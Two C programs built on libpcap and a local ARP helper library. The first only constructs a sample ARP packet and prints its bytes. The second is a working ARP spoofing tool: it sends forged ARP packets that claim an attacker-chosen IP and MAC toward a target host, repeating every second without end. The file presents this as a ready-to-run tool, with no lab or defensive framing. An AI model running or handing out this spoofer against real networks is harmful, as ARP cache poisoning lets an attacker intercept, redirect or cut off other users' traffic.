#include <stdio.h>
#include <string.h>
#define __linux__
#include "./ARPLIB/arplib.h"


int main(void)
{
    int i;
    unsigned char smac[6],dmac[6];
    unsigned int sip, tip;
    unsigned char *ptr;
    struct arp_packet arp_packet;

    ptr = (unsigned char *) &arp_packet;
    memset(&arp_packet,0x00, sizeof(arp_packet));

    strmac_to_buffer("11:22:33:44:55:66",smac);
    strmac_to_buffer("aa:bb:cc:dd:ee:ff",dmac);

    sip = 0x11223344;
    tip = 0x55667788;

    make_ether_header(
            &(arp_packet.ether_header),dmac,smac,ETHERTYPE_ARP
            );
    make_arp_header(
            &(arp_packet.ether_arp),smac,sip,dmac,tip,1
            );
    printf("struct ether_header : %lu\n",
           (unsigned long) sizeof(struct ether_header));
    printf("struct ether_arp : %lu\n",
           (unsigned long)sizeof(struct ether_arp));
    printf("struct arp_packet : %lu\n\n",
           (unsigned long) sizeof(struct arp_packet));

    for(i=0; i < sizeof(arp_packet);i++){
        printf("%02x ",ptr[i]);

        if((i+1)%16 == 0) printf("\n");
    }
    printf("\n");
    return 0;
}
#include <stdio.h>
#include <string.h>
#define __linux__
#ifndef __linux__
    #include <winsock2.h>
    #include <windows.h>
#else
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
#endif

#include "./ARPLIB/arplib.h"
#include "pcap.h"

enum{
    ARGV_CMD,
    ARGV_TARGET_IP,
    ARGV_SPOOF_IP,
    ARGV_SPOOF_MAC
};

int main(int argc, char **argv)
{
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE]; //error buffer
    pcap_if_t *alldevs, *d; //container and pointer
    int no, i =0;

    struct arp_packet arp_packet; //arp packet
    int arp_source_ip, arp_target_ip;

    unsigned char buffer_mac[6];
    unsigned char anymac[] = {0xff,0xff,0xff,0xff,0xff,0xff}; //any mac address
    unsigned char *arp_source_mac, *ether_source_mac, *ether_dest_mac;

    if(argc !=4){
        printf("Usage : %s[Target IP][IP][MAC]\n",argv[0]);
        return 1;
    }
    if(pcap_findalldevs(&alldevs,errbuf)<0){ // find all device and save into alldevs
        printf("pcap_findalldevs error\n");
        return 1;
    }
    for(d=alldevs; d; d= d->next){ //print out device
        printf("%d : %s\n",++i,(d->description)?(d->description):(d->name));
    }
    printf("number : "); //select interface
    scanf("%d",&no);

    if(!(no > 0 && no <= i)){
        printf("number error\n");
        return 1;
    }
    for(d=alldevs, i=0; d; d=d->next){
        if(no==++i) break;
    }
    if(!(adhandle=pcap_open_live(d->name,65536,1,1000,errbuf))){
        printf("pcap_open_live error %s\n",d->name);
        pcap_freealldevs(alldevs);
        return -1;
    }
    pcap_freealldevs(alldevs);
    //ARP + Ethernet setting
    arp_source_ip = inet_addr(argv[ARGV_SPOOF_IP]); //ip
    arp_target_ip = inet_addr(argv[ARGV_TARGET_IP]); //ip

    strmac_to_buffer(argv[ARGV_SPOOF_MAC],buffer_mac); //macc

    ether_dest_mac = anymac;
    ether_source_mac = arp_source_mac = buffer_mac;

    make_ether_header(
           &(arp_packet.ether_header),
           ether_dest_mac,ether_source_mac,ETHERTYPE_ARP
            );
    make_arp_header(
            &(arp_packet.ether_arp),
            arp_source_mac,arp_source_ip,
            NULL,arp_target_ip,1
            );
    while(1){
        pcap_sendpacket(
                adhandle,(unsigned char *)&arp_packet,sizeof(arp_packet)
                );
#ifndef __linux__
        Sleep(1000);
#else
        sleep(1);
#endif
    }
    pcap_close(adhandle);
    return 0;
}
